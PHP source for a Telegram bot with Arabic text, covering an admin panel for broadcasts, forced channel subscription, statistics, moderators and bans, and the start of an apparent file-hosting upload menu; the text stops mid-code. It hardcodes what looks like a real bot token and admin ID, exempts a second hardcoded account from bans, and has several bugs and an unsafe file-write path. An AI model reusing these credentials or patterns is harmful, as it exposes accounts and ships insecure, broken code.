<?php

$API_KEY = "7684981468:AAE6ExrtijmIWMWT6iwYt1g41FMTWokDSkY" ; // توكنك
$admin = 8080663195 ; // ايديك
define('API_KEY',$API_KEY);
define("IDBot", explode(":", $API_KEY)[0]);


function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $options = [
        'http' => [
            'method'  => 'POST',
            'content' => http_build_query($datas),
            'header'  => 'Content-Type: application/x-www-form-urlencoded\r\n',
        ],
    ];
    $context  = stream_context_create($options);
    $res = file_get_contents($url, false, $context);

    if ($res === FALSE) {
        return json_encode(['error' => 'Request failed']);
    } else {
        return json_decode($res);
    }
}

$usrbot = bot("getme")->result->username;
$emoji = "➡️
🎟️
↪️
🔘
🏠";

$emoji = explode("\n", $emoji);
$b = $emoji[rand(0, 4)];
$NamesBACK = "رجوع $b";

define("USR_BOT", $usrbot);
mkdir("UploadEr");

function SETJSON($INPUT)
{
    if ($INPUT != NULL || $INPUT != "") {
        $F = "UploadEr/UploadEr.json";
        $N = json_encode($INPUT, JSON_PRETTY_PRINT);

        file_put_contents($F, $N);
    }
}

$array1 = json_decode(file_get_contents('data/users.json'),true);
$array2 = json_decode(file_get_contents('data/emails.json'),true);
$array3 = json_decode(file_get_contents('data/command.json'),true);
$update     = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message_id = $message->message_id;
$text           = $message->text;
$chat_id    = $message->chat->id;
$from_id     = $message->from->id;
$data = $update->callback_query->data;
$chatid = $update->callback_query->message->chat->id;
$messageid = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$username = $message->from->username;
$type       = $message->chat->type;
$name = $message->from->first_name;
$name2 = $update->callback_query->from->first_name;
$name_tag = "[$name](tg://user?id=$from_id)";
$name_tag2 = "[$name2](tg://user?id=$chat_id2)";
/////
$update = json_decode(file_get_contents('php://input'));
$message= $update->message;
$text = $message->text;
$chat_id= $message->chat->id;
$name = $message->from->first_name;
$user = $message->from->username;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$a = strtolower($text);
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
//\\
mkdir("data/$chat_id");
$log = file_get_contents("data/$chat_id/$chat_id.txt");
$EG = file_get_contents("data/$chat_id/eg".$chat_id.".txt");
$c20 = file_get_contents("data/$chat_id/20".$chat_id.".txt");
//\\
$msg = file_get_contents("msg.php");
$forward = file_get_contents("forward.php");
$midea = file_get_contents("midea.php");
$inlin = file_get_contents("inlin.php");
$photoi = file_get_contents("photoi.php");
$upq = file_get_contents("up.php");
$skor = file_get_contents("skor.php");

mkdir("data");

$channel = file_get_contents("link.php");
$link = file_get_contents("link2.php");
$ch = "$channel"; 
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$ch&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
 'text'=>"
»  عليك الاشتراك في قناة تحديثات البوت اولا 📨
»  ليمكنك استخدام البوت  🔊
»  اشترك ثم ارسل { /start }
»  [اضغط هنا للشتراك في القناة]($link)",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);return false;}

$uuser = file_get_contents("uuser.php");
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$uuser&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
 'text'=>"
»  عليك الاشتراك في قناة تحديثات البوت اولا 📨
»  ليمكنك استخدام البوت  🔊
»  اشترك ثم ارسل { /start }
»  $uuser",
]);return false;}

$users = explode("\n",file_get_contents("abbas.json"));

if($message){
if(!in_array($from_id,$users)){
file_put_contents("abbas.json",$from_id."\n",FILE_APPEND);}}

$tc = $message->chat->type;
$abbas09 = json_decode(file_get_contents("abbas09.json"),true);
$suodo = $abbas09['sudoarr'];
$al = $abbas09['addmessage'];
$ab = $abbas09['messagee'];
$xll = $al + $ab;
if($message and $from_id !== $admin){
$abbas09['messagee'] = $abbas09['messagee']+1;
file_put_contents("abbas09.json",json_encode($abbas09,32|128|265));
}
if($message and $from_id == $admin){
$abbas09['addmessage'] = $abbas09['addmessage']+1;
file_put_contents("abbas09.json",json_encode($abbas09,32|128|265));
}

$all = count($users)-1;

$adminss = explode("\n",file_get_contents("ad.json"));

$a3bs9 = file_get_contents("data/a3bs9.txt");
$q1 = file_get_contents("data/q1.txt");
$q2 = file_get_contents("q2.txt");
$q3 = file_get_contents("data/q3.txt");
$q4 = file_get_contents("q4.txt");
$q5 = file_get_contents("data/q5.txt");
$aralikan = file_get_contents("q6.txt");

if($message){
if(!in_array($admin,$adminss)){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
تم تحديث القائمه /start
",
]);
file_put_contents("ad.json",$admin."\n",FILE_APPEND);
}}

$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
$todayuser = count($day);
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wedtxt");
}
if($d == "Fri"){
unlink("Thu.txt");
}
if($message and !in_array($from_id, $day)){ 
file_put_contents($d.".txt",$from_id. "\n",FILE_APPEND);
}

$from_id = $message->from->id;
$name = $message->from->first_name;
$id = $message->from->id;
$user = $message->from->username;
if($user){
$user = "@$user";
}
elseif(!$uaer){
$user = "بلا معرف";
}
if($text =="/start" and !in_array($from_id,$users)){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
٭ تم دخول شخص جديد الى البوت الخاص بك 👾
. — — — — — — — — — — .
• معلومات العضو الجديد .
. — — — — — — — — — — .
• الاسم : $name
• المعرف : $user
• الايدي : $id
. — — — — — — — — — — .
• عدد الاعضاء الكلي : $all
",
]);
}

$bot = file_get_contents("bot.txt");

if($text =="/admin" and in_array($from_id,$adminss)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*-•
~ اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖

~ يمكنك التحكم في جميع اوامر البوت من هنا 
------------------------------------  
*",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- قفل البوت ❌.","callback_data"=>"abcd"],["text"=>"- فتح البوت ✅.","callback_data"=>"abcde"]],
[["text"=>"- اعضاء البوت 👥.","callback_data"=>"userd"]],
[["text"=>"- تفعيل التنبيه 🔔.","callback_data"=>"ont"],["text"=>"- تعطيل التنبيه 🔕.","callback_data"=>"oft"]],
[["text"=>"- قسم الاذاعةه 📢.","callback_data"=>"for"]],
[['text' => "- قائمةه الاشتراك 🗣.", 'callback_data' => "channel"],['text' => "- الاشتراك ($skor) .", "callback_data" => "off"]],
[['text' => "- الاحصائيات 📊.", 'callback_data' => "pannel"],['text' => "- قسم المشرفين 👮‍♂️.", 'callback_data' => "lIllabbas"]],
]])
]); 
}

//
if($data =="lIllabbas"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*
 اهلا بك في قسم مشرفين 👮‍♂️
 يمكنك من خلال هذا القسم
 ☆☆☆☆☆☆☆☆☆☆☆☆☆
 رفع مشرف - تنزيل مشرف - حدف جميع المشرفين
*", 
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- رفع مشرف 👮‍♂️.","callback_data"=>"adl"]],
[["text"=>"- اخر المشرفين👮‍♂️.","callback_data"=>"addmin"]],
[["text"=>"- حدف جميع المشرفين👮‍♂️.","callback_data"=>"delateaddmin"]],
]])
]);   
}

if($data == "adl"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
قم بارسال ايدي العضو 🆔️
 ",
]); 
file_put_contents("data/a3bs9.txt","a3bs9");
}
if($text !="/start" and $a3bs9 == "a3bs9" and !in_array($text,$adminss)){
file_put_contents("data/a3bs9.txt","none");
file_put_contents("ad.json",$text."\n",FILE_APPEND);} 

if($text != "/start" and $a3bs9 == "a3bs9" and !in_array($text,$adminss)){
file_put_contents("data/a3bs9.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم رفع العضو ✅", 
]);
bot('sendmessage',[
'chat_id'=>$text,
'text'=>"تم رفعك مشرف في البوت 👮‍♂️", 
]);
}
if($text !="/start" and $a3bs9 == "a3bs9" and in_array($text,$adminss)){
file_put_contents("data/a3bs9.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"العضو مشرف بالفعل👮‍♂️", 
]);
}
if($data =="addmin"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"اخر خمس مشرفيه 👥👮‍♂️:
 1 - ".$adminss[count($adminss)-2]."
 2 - ️".$adminss[count($adminss)-3]."
 3 - ️".$adminss[count($adminss)-4]."
 4 - ️".$adminss[count($adminss)-5]."
 5 - ️".$adminss[count($adminss)-6]."
",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- الصفحه الرئيسيه.","callback_data"=>"bak"]],
]])
]);   
}
if($data =="delateaddmin" and $chat_id2 =="$admin"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
هل انت متاكد من الحذف ❓
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'لا ❌' ,'callback_data'=>"bak"]],
[['text'=>'نعم ✅' ,'callback_data'=>"yesaarsslan"]],
]])
]);
}
if($data =="yesaarsslan"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
تم حذف المشرفيه👥✅
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
unlink("ad.json");
}

if($data =="abcde"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"- اهلا بك عزيزي
- تم فتح البوت 
- /start",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
file_put_contents("bot.txt","مفتوح");
} 
if($data =="abcd"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"- اهلا بك عزيزي
- تم قفل البوت
- /start ",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]); 
file_put_contents("bot.txt","متوقف");
} 

if($text =="/start" and $bot =="متوقف" and $chat_id != "$admin"){
 bot("sendmessage",[
 "chat_id"=>$chat_id,
 "text"=>"تم اغلاق البوت لي اصلاح بعض المشاكل",]);
}

if($data =="userd"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 اهلا بك عزيزي المشرف
 عدد الاعضاء : ( $all )
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
}

if($data == 'ont'){
file_put_contents("ont.php", "on");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
 تم تفعيل الاشعارات في البوت🔔
➖➖➖➖➖➖➖➖
",
'show_alert'=>true
]);
}
if($data == 'oft'){
file_put_contents("ont.php", "off");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
⚠ تم تعطيل الاشعارات في البوت
➖➖➖➖➖➖➖➖
",
'show_alert'=>true
]);
}
$ont = file_get_contents("ont.php");
if($ont == "on"){
if($from_id != $admin){
if($message){
bot('ForwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}}}

if($data == "for"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
حسنا عزيزي
قم باختيار ما يناسبك
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اذاعه صورة 🖼",'callback_data'=>"photoi"]],
[['text' => "اذاعه رسالة ✉", 'callback_data' => "msg"],['text' => "اذاعه توجيه ", 'callback_data' => "forward"]],
[['text' => "اذاعه ميديا ✅", 'callback_data' => "midea"],['text' => "اذاعه انلاين ", 'callback_data' => "inline"]],
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
if($data == "msg"){
file_put_contents("msg.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال رسالتك لتحويلها لجميع المشتركين
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($msg == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('sendmessage',[
'chat_id'=>$users[$i],
'text'=>"$text",
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
حسنا عزيزي
تم عمل اذاعه بنجاح 📢
الى ( $all ) مشترك
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("msg.php");
}}
if($data == "forward"){
file_put_contents("forward.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
حسنا عزيزي
قم بأرسال رسالتك لتحويلها لجميع المشتركين على شكل توجيه
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($forward == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('ForwardMessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
حسنا عزيزي
تم عمل اذاعه توجيه بنجاح 📢
الى ( $all ) مشترك
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"bak"]],
]])
]);
unlink("forward.php");
}}
if($data == "midea"){
file_put_contents("midea.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
يمكنك استخدام جميع انوع الميديا ماعدى الصوره
(ملصق - فيديو - بصمه - ملف صوتي - ملف - متحركه - جهة اتصال )
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
$up = json_decode(file_get_contents('php://input'),true);
if(!isset($message->text)){
$types = ['voice','audio','video','photo','contact','document','sticker'];
foreach($up['message'] as $key => $val){
if(in_array($key,$types) and $midea == "on"){
for($i=0;$i<count($users); $i++){
bot('send'.$key,[
'chat_id'=>$users[$i],
'caption'=>$message->caption,
$key=>$val['file_id']]);
unlink("midea.php");
}
}
}}
if($data == "photoi"){
file_put_contents("photoi.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
حسنا عزيزي
قم بأرسال الصورة لنشرها لجميع المشتركين
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($photoi == "on"){
if($message->photo){
for($i=0;$i<count($users); $i++){
bot('sendphoto',[
'chat_id'=>$users[$i],
'photo'=>$message->photo[0]->file_id,
'caption'=>$message->caption,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*
حسنا عزيزي
تم نشر الصورة بنجاح 📢
الى ( $all ) مشترك
*",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("photoi.php");
}}
if($data == "inline"){
file_put_contents("inlin.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بتوجيه نص الانلاين لاقوم بنشره للمشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($inlin == "on"){
if($message->forward_from or $message->forward_from_chat){
for($i=0;$i<count($users); $i++){
bot('forwardmessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم نشر الانلاين بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("inlin.php");
}}

if($data == "channel"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بتحديد الامر لأتمكن من تنفيذه",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"قناة خاصة ",'callback_data'=>"link"]],
[['text'=>"قناة عامة ",'callback_data'=>"user"]],
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
if($data == "link"){
file_put_contents("link.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم برفع البوت مشرف في القناة
 ثم ارسل توجيه من القناة الى هنا",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
$channel_id = $message->forward_from_chat->id;
if($channel == "on"){
if($message->forward_from_chat){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 قم الان بأرسال رابط القناة هنا",
]);
file_put_contents("link.php", $channel_id);
file_put_contents("link2.php", "on");
}}
if($link == "on"){
if(preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me|(.*)telesco.me|telesco.me(.*)/i',$text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم تفعيل الاشتراك بنجاح",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اتمام العملية",'callback_data'=>"bak"]],
]])
]);
file_put_contents("link2.php", $text);
file_put_contents("skor.php", "مفعل ✅");
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 عذرا عزيزي
 قم بأرسال الرابط بصورة صحيحه",
]);
}
}

if($data == "user"){
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم برفع البوت مشرف في القناة
 ثم ارسل يوزر القناة لتفعيل الاشتراك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
file_put_contents("uuser.php", "on");
}
if($uuser == "on"){
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)#(.*)|#(.*)|(.*)#/',$text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم تفعيل الاشتراك بنجاح",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اتمام العملية ⏱",'callback_data'=>"bak"]],
]])
]);
file_put_contents("skor.php", "مفعل ✅");
file_put_contents("uuser.php", $text);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 عذرا عزيزي
 قم بأرسال يوزر بصورة صحيحه",
]);
}
}

if($skor == "معطل ⚠️"){
if($data == 'off'){
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>'
 مرحبا عزيزي
 حالة الاشتراك الاجباري معطل
 قم بختيار - قائمةه الاشتراك .وقم بتفعيله
',
 'show_alert'=>true
 ]); 
}}
if($skor == "مفعل ✅"){
if($data == 'off'){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'
 حسنا عزيزي
 حالت الاشتراك الخاص بك مفعل
 هل انت متأكد من رغبتك في تعطيل الاشتراك
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'نعم ', 'callback_data'=>'yesde2'],
['text'=>'لا ','callback_data'=>'bak'],
]
]])
]);
}}

if($data == "yesde2"){
unlink("uuser.php");
unlink("link.php");
file_put_contents("skor.php", "معطل ⚠️");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 تم تعطيل الاشتراك في جميع القنواة
 يمكنك تفعيل الاشتراك لقناتك في مابعد",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"bak"]],
]])
]);
}

$bloktime = date('h:i:s A');
if($data == "file"){
$path = realpath("abbas.json");
bot('senddocument',[
'chat_id'=>$chat_id2,
'document'=>new CURLFile($path),
'caption'=>"
 نسخة لمشتركينك
 وقت الارسال : ( $bloktime )
 عدد المشتركين : ( $all )
",
]);
}

if($data == "up"){
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال ملف الاعضاء الان
 ارسل الملف بأسم : abbas.json",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
file_put_contents("up.php", "on");
}
$rep = $message->document->file_name;
if($upq == "on"){
if($message->document and $message->document->file_name == "abbas.json" ){
$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->reply_to_message->document->file_id])->result->file_path;
file_put_contents($message->reply_to_message->document->file_name,file_get_contents($file));
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"* تم رفع الملف  : $rep*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
unlink("up.php");
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"* لايمكن رفع الملف  : $rep*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
}

if($data =="pannel"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*اهلا بك في قسم - الاحصائيات . 📊
. — — — — — — — — — — .
 عدد اعضاء بوتك : $all
 المتفاعلين اليوم  : $todayuser
 عدد الرسائل المرسله : ".$abbas09['addmessage']."
 عدد الرسائل المستلمه : ".$abbas09['messagee']."
 مجموع الرسائل : $xll
. — — — — — — — — — — .
 اخر خمس مشتركين :
▫️ 1- ".$users[count($users)-2]."
▫️ 2- ️".$users[count($users)-3]."
▫️ 3- ️".$users[count($users)-4]."
▫️ 4- ️".$users[count($users)-5]."
▫️ 5- ️".$users[count($users)-6]."
. — — — — — — — — — — .*",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
}

if($data == "editstart"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
قم بارسال رسالة الاستارت الان
 ",
]); 
file_put_contents("data/q1.txt","q1");
}
if($text != "/start" and $q1 == "q1"){
file_put_contents("data/q1.txt","none");
file_put_contents("q2.txt","$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم التعين بنجاح", 
]);
}

if ($data == 'bak'){
$msg = unlink("msg.php");
unlink("forward.php");
unlink("midea.php");
unlink("inlin.php");
unlink("photoi.php");
unlink("up.php");
unlink("up.php");
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*-•
~ اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖

~ يمكنك التحكم في جميع اوامر البوت من هنا 
------------------------------------
*",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- قفل البوت ❌.","callback_data"=>"abcd"],["text"=>"- فتح البوت ✅.","callback_data"=>"abcde"]],
[["text"=>"- اعضاء البوت 👥.","callback_data"=>"userd"]],
[["text"=>"- تفعيل التنبيه 🔔.","callback_data"=>"ont"],["text"=>"- تعطيل التنبيه 🔕.","callback_data"=>"oft"]],
[["text"=>"- قسم الاذاعةه 📢.","callback_data"=>"for"]],
[['text' => "- قائمةه الاشتراك 🗣.", 'callback_data' => "channel"],['text' => "- الاشتراك ($skor) .", "callback_data" => "off"]],
[['text' => "- الاحصائيات 📊.", 'callback_data' => "pannel"],['text' => "- قسم المشرفين 👮‍♂️.", 'callback_data' => "lIllabbas"]],
]])
]);   
}

$update = json_decode(file_get_contents('php://input'));

if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$UploadEr = json_decode(file_get_contents("UploadEr/UploadEr.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}

if ($UploadEr["mems"][$from_id] == null) {
	$UploadEr["mems"][$from_id] = 1 ;
	$UploadEr["memsA"][] = $from_id ;
        SETJSON($UploadEr);
	} 
	if($data == "sendReport") {
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
#️⃣] ارسل الان الكليشه التوضيحيه للمطور
ℹ️] ان كان عن طريق الخطا سيتم فك الحظر
" ,
        ]);
	$UploadEr["mode"][$from_id] = "sR" ;
        SETJSON($UploadEr);
        return false ;
	} 
	
	if($text and $UploadEr["mode"][$from_id] == "sR") {
		bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "✅] تم استلام الطلب سيتم مراجعته في اقرب وقت ممكن",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "🎃] طلب فك حظر عزيزي المبرمج
            🔖] من $name
 
[$from_id](tg://user?id=$chat_id) 
[Acount](tg://openmessage?user_id=$chat_id) 

الكليشه : $text
لفك الحظر عنه ارسل [/Unb_$from_id] 
",
            "parse_mode" => "markdown"
            
        ]);
        $UploadEr["mode"][$from_id] = null ;
        SETJSON($UploadEr);
        return false ;
		} 
$not = array("$admin", "1427981991");
if (isset($from_id) && is_array($UploadEr)) {
	if (in_array($from_id, $UploadEr)) {
    if (!in_array($from_id, $not)) {
        bot("deleteMessage", [
            "chat_id" => $chat_id,
            "message_id" => $UploadEr["m_id"][$from_id]
        ]);
        $n = bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "⚠️ You are banned from using the bot due to violations.\n⚠️ تم حظرك من استخدام الروبوت بسبب الانتهاكات.",
            "parse_mode" => "markdown", 
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"ارسال طلب فك حظر",'callback_data'=>"sendReport" ]], 
      ]
    ])
        ]);
        $UploadEr["m_id"][$from_id] = $n->result->message_id;
        SETJSON($UploadEr);
        return false;
       } 
    }
}


		
		if(preg_match("/Unb_/", $text)) {
			if($from_id == $admin) {
				$B=array_search(explode("_",$text)[1],$UploadEr);
        unset($UploadEr[$B]);
        SETJSON($UploadEr);
				bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "
            Done ✅
            Id : (". explode("_",$text)[1].") / $B
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => explode("_",$text)[1] ,
            "text" => "⚠️] تم فك الحظر عن حسابك
🤔] الرجاء التزام بقوانين البوت
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendmessage",[
                "chat_id" => explode("_",$text)[1], 
                "text" => "[King Tom](tg://openmessage?user_id=1427981991)

• مرحبا بك ⦗ [$name](tg://user?id=$from_id) ⦘
• ارسل الملف الان لرفعه علي الاستضافه 
• ملفاتك المرفوعه ← ⦗ $counts ⦘
• عدد جميع ملفات المرفوعه ← ⦗ $vc | $no ⦘
• عدد مستخدمين البوت ← ⦗ $nj ⦘
• تعليمات البوت ← ⦗ /help ⦘",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"رفع الملف 📤",'callback_data'=>"SendFile"]],
     [['text'=>"تحديث البوت ♻️",'callback_data'=>"refr" ],['text'=>"احصائيات الرفع 📊",'callback_data'=>"nas" ]], 
